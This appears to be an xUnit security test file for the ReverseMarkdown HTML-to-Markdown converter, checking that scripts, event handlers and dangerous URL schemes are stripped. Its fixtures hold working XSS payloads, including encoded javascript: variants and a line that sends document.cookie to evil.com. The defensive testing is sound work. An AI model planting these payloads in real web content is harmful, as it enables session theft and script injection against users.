using Xunit;

namespace ReverseMarkdown.Test
{
    /// <summary>
    /// Security tests to verify HTML sanitization and XSS prevention
    /// </summary>
    public class SecurityTests
    {
        private readonly Converter _converter;

        public SecurityTests()
        {
            _converter = new Converter();
        }

        #region Script Tag Tests

        [Fact]
        public void ShouldDropScriptTags()
        {
            const string html = "<div>Safe content<script>alert('XSS')</script>More content</div>";
            string result = _converter.Convert(html);

            Assert.DoesNotContain("<script>", result);
            Assert.DoesNotContain("alert", result);
            Assert.Contains("Safe content", result);
            Assert.Contains("More content", result);
        }

        [Fact]
        public void ShouldDropScriptTagsWithAttributes()
        {
            const string html = "<div>Content<script type=\"text/javascript\" src=\"evil.js\">malicious()</script>End</div>";
            string result = _converter.Convert(html);

            Assert.DoesNotContain("<script", result);
            Assert.DoesNotContain("evil.js", result);
            Assert.DoesNotContain("malicious", result);
            Assert.Contains("Content", result);
            Assert.Contains("End", result);
        }

        [Fact]
        public void ShouldDropInlineScriptBlocks()
        {
            const string html = @"
                <p>Paragraph 1</p>
                <script>
                    fetch('https://evil.com/steal?data=' + document.cookie);
                </script>
                <p>Paragraph 2</p>";

            string result = _converter.Convert(html);

            Assert.DoesNotContain("<script>", result);
            Assert.DoesNotContain("fetch", result);
            Assert.DoesNotContain("evil.com", result);
            Assert.DoesNotContain("document.cookie", result);
            Assert.Contains("Paragraph 1", result);
            Assert.Contains("Paragraph 2", result);
        }

        #endregion

        #region Event Handler Tests

        [Fact]
        public void ShouldHandleOnclickAttribute()
        {
            const string html = "<div onclick='alert(\"XSS\")'>Click me</div>";
            string result = _converter.Convert(html);

            // HtmlAgilityPack parses but doesn't execute - output should not contain executable code
            // The text content should be preserved
            Assert.Contains("Click me", result);
            // Markdown output shouldn't have onclick
            Assert.DoesNotContain("onclick", result.ToLower());
        }

        [Fact]
        public void ShouldHandleMultipleEventHandlers()
        {
            const string html = @"
                <button onclick='hack()' onmouseover='exploit()' onerror='attack()'>
                    Button Text
                </button>";

            string result = _converter.Convert(html);

            Assert.Contains("Button Text", result);
            Assert.DoesNotContain("onclick", result.ToLower());
            Assert.DoesNotContain("onmouseover", result.ToLower());
            Assert.DoesNotContain("onerror", result.ToLower());
            Assert.DoesNotContain("hack()", result);
            Assert.DoesNotContain("exploit()", result);
            Assert.DoesNotContain("attack()", result);
        }

        [Fact]
        public void ShouldHandleImgOnerror()
        {
            const string html = "<img src='x' onerror='alert(1)' alt='Image'>";
            string result = _converter.Convert(html);

            // Image markdown should be generated but without onerror
            Assert.DoesNotContain("onerror", result.ToLower());
            Assert.DoesNotContain("alert", result);
        }

        #endregion

        #region JavaScript Protocol Tests

        [Fact]
        public void ShouldHandleJavascriptProtocolInHref()
        {
            const string html = "<a href='javascript:alert(\"XSS\")'>Click</a>";
            string result = _converter.Convert(html);

            Assert.Contains("Click", result);
            // Link should either be dropped or sanitized
            // Markdown output should NOT contain javascript: protocol
        }

        [Fact]
        public void ShouldHandleJavascriptProtocolVariations()
        {
            var variations = new[]
            {
                "javascript:alert(1)",
                "JavaScript:alert(1)",
                "JAVASCRIPT:alert(1)",
                "java\nscript:alert(1)",
                "java&#x09;script:alert(1)",
                "&#x6A;avascript:alert(1)"
            };

            foreach (var jsUrl in variations)
            {
                string html = $"<a href='{jsUrl}'>Link</a>";
                string result = _converter.Convert(html);

                Assert.Contains("Link", result);
                // Output should not contain javascript protocol or alert
                Assert.DoesNotContain("alert", result);
            }
        }

        [Fact]
        public void ShouldAllowSafeProtocols()
        {
            var safeUrls = new[]
            {
                "https://example.com",
                "http://example.com",
                "mailto:user@example.com",
                "tel:+1234567890",
                "/relative/path",
                "#anchor"
            };

            foreach (var safeUrl in safeUrls)
            {
                string html = $"<a href='{safeUrl}'>Link</a>";
                string result = _converter.Convert(html);

                Assert.Contains("Link", result);
                // Should generate valid markdown link
                Assert.Matches(@"\[.*\]\(.*\)", result);
            }
        }

        #endregion

        #region Data URI Tests

        [Fact]
        public void ShouldHandleDataUriWithHtml()
        {
            const string html = "<a href='data:text/html,<script>alert(1)</script>'>Link</a>";
            string result = _converter.Convert(html);

            Assert.Contains("Link", result);
            // Data URI might be allowed but content should not execute
        }

        [Fact]
        public void ShouldHandleDataUriInImg()
        {
            const string html = "<img src='data:image/svg+xml,<svg onload=alert(1)>' alt='SVG'>";
            string result = _converter.Convert(html);

            // SVG with scripts should be handled safely
            // Either allowed as data URI or dropped
        }

        #endregion

        #region HTML Injection Tests

        [Fact]
        public void ShouldHandleHtmlEntitiesInAttributes()
        {
            const string html = "<div title='&lt;script&gt;alert(1)&lt;/script&gt;'>Content</div>";
            string result = _converter.Convert(html);

            Assert.Contains("Content", result);
            // Entities should be decoded by HtmlAgilityPack but not executed
        }

        [Fact]
        public void ShouldHandleNestedHtmlInDataAttributes()
        {
            const string html = "<div data-content='<script>alert(1)</script>'>Text</div>";
            string result = _converter.Convert(html);

            Assert.Contains("Text", result);
            // Data attributes should not appear in markdown output
            Assert.DoesNotContain("script", result);
        }

        [Fact]
        public void ShouldHandleStyleInjection()
        {
            const string html = @"
                <div style='background-image: url(javascript:alert(1))'>Content</div>";

            string result = _converter.Convert(html);

            Assert.Contains("Content", result);
            // Style attributes should be ignored in markdown conversion
            Assert.DoesNotContain("javascript", result.ToLower());
            Assert.DoesNotContain("alert", result);
        }

        #endregion

        #region Style Tag Tests

        [Fact]
        public void ShouldDropStyleTags()
        {
            const string html = @"
                <style>
                    body { background: url('javascript:alert(1)'); }
                </style>
                <p>Content</p>";

            string result = _converter.Convert(html);

            Assert.DoesNotContain("<style>", result);
            Assert.DoesNotContain("background", result);
            Assert.DoesNotContain("javascript", result.ToLower());
            Assert.Contains("Content", result);
        }

        #endregion

        #region Comment Injection Tests

        [Fact]
        public void ShouldHandleHtmlComments()
        {
            const string html = "<!-- <script>alert(1)</script> --><p>Content</p>";
            var config = new Config { RemoveComments = true };
            var converter = new Converter(config);

            string result = converter.Convert(html);

            Assert.DoesNotContain("<!--", result);
            Assert.DoesNotContain("script", result);
            Assert.Contains("Content", result);
        }

        [Fact]
        public void ShouldHandleConditionalComments()
        {
            const string html = @"
                <!--[if IE]>
                <script>malicious()</script>
                <![endif]-->
                <p>Content</p>";

            var config = new Config { RemoveComments = true };
            var converter = new Converter(config);

            string result = converter.Convert(html);

            Assert.DoesNotContain("malicious", result);
            Assert.Contains("Content", result);
        }

        #endregion

        #region Complex XSS Vectors

        [Fact]
        public void ShouldHandleSvgXss()
        {
            const string html = @"
                <svg onload='alert(1)'>
                    <circle cx='50' cy='50' r='40'/>
                </svg>
                <p>Content</p>";

            string result = _converter.Convert(html);

            Assert.Contains("Content", result);
            // SVG is unknown tag - behavior depends on Config.UnknownTags
            // By default (PassThrough), it might keep SVG, but events should not execute in markdown
        }

        [Fact]
        public void ShouldHandleIframeInjection()
        {
            const string html = @"
                <iframe src='javascript:alert(1)'></iframe>
                <p>Content</p>";

            string result = _converter.Convert(html);

            Assert.Contains("Content", result);
            // iframe is unknown tag - should be handled safely
        }

        [Fact]
        public void ShouldHandleObjectEmbed()
        {
            const string html = @"
                <object data='javascript:alert(1)'></object>
                <embed src='javascript:alert(1)'>
                <p>Content</p>";

            string result = _converter.Convert(html);

            Assert.Contains("Content", result);
            // object/embed should not execute javascript
        }

        [Fact]
        public void ShouldHandleFormAction()
        {
            const string html = @"
                <form action='javascript:alert(1)'>
                    <input type='submit' value='Submit'>
                </form>
                <p>Content</p>";

            string result = _converter.Convert(html);

            Assert.Contains("Content", result);
            // Form should be converted to text without executable content
            Assert.DoesNotContain("javascript:", result.ToLower());
        }

        [Fact]
        public void ShouldHandleBaseHref()
        {
            const string html = @"
                <base href='javascript:alert(1)'>
                <p>Content</p>";

            string result = _converter.Convert(html);

            Assert.Contains("Content", result);
            // base tag should not affect markdown output
        }

        [Fact]
        public void ShouldHandleMetaRefresh()
        {
            const string html = @"
                <meta http-equiv='refresh' content='0;url=javascript:alert(1)'>
                <p>Content</p>";

            string result = _converter.Convert(html);

            Assert.Contains("Content", result);
            // meta tags should be ignored in body conversion
        }

        #endregion

        #region Google Docs Export Scenarios

        [Fact]
        public void ShouldHandleGoogleDocsStyleMarkup()
        {
            // Typical Google Docs export with inline styles
            const string html = @"
                <div style='font-family:Arial'>
                    <p style='margin:0'>Content</p>
                    <script>
                        // Google Analytics or other tracking
                        ga('send', 'pageview');
                    </script>
                </div>";

            string result = _converter.Convert(html);

            Assert.Contains("Content", result);
            Assert.DoesNotContain("script", result);
            Assert.DoesNotContain("pageview", result);
        }

        [Fact]
        public void ShouldHandleGoogleDocsComments()
        {
            const string html = @"
                <p>Text with <!-- Google Docs comment --> inline comment</p>";

            var config = new Config { RemoveComments = true };
            var converter = new Converter(config);

            string result = converter.Convert(html);

            Assert.Contains("Text with", result);
            Assert.Contains("inline comment", result);
            Assert.DoesNotContain("<!--", result);
        }

        #endregion

        #region URI Scheme Whitelist Tests

        [Fact]
        public void ShouldRespectWhitelistUriSchemes()
        {
            var config = new Config();
            config.WhitelistUriSchemes.Add("http");
            config.WhitelistUriSchemes.Add("https");

            var converter = new Converter(config);

            const string html = @"
                <a href='http://safe.com'>HTTP Link</a>
                <a href='ftp://unsafe.com'>FTP Link</a>
                <a href='javascript:alert(1)'>JS Link</a>";

            string result = converter.Convert(html);

            Assert.Contains("HTTP Link", result);
            // Behavior with whitelist depends on implementation
            // Should filter out non-whitelisted schemes
        }

        #endregion

        #region Edge Cases

        [Fact]
        public void ShouldHandleEmptyHtml()
        {
            string result = _converter.Convert("");
            Assert.Equal("", result);
        }

        [Fact]
        public void ShouldHandleNullOrWhitespace()
        {
            string result = _converter.Convert("   \n\t   ");
            Assert.True(string.IsNullOrWhiteSpace(result));
        }

        [Fact]
        public void ShouldHandleMalformedHtml()
        {
            const string html = "<div><p>Unclosed tags<script>alert(1)";
            string result = _converter.Convert(html);

            Assert.DoesNotContain("alert", result);
            Assert.Contains("Unclosed tags", result);
        }

        [Fact]
        public void ShouldHandleDeeplyNestedStructures()
        {
            string html = "<div>";
            for (int i = 0; i < 100; i++)
            {
                html += "<div>";
            }
            html += "<script>alert(1)</script>Content";
            for (int i = 0; i < 100; i++)
            {
                html += "</div>";
            }
            html += "</div>";

            string result = _converter.Convert(html);

            Assert.Contains("Content", result);
            Assert.DoesNotContain("alert", result);
        }

        #endregion
    }
}
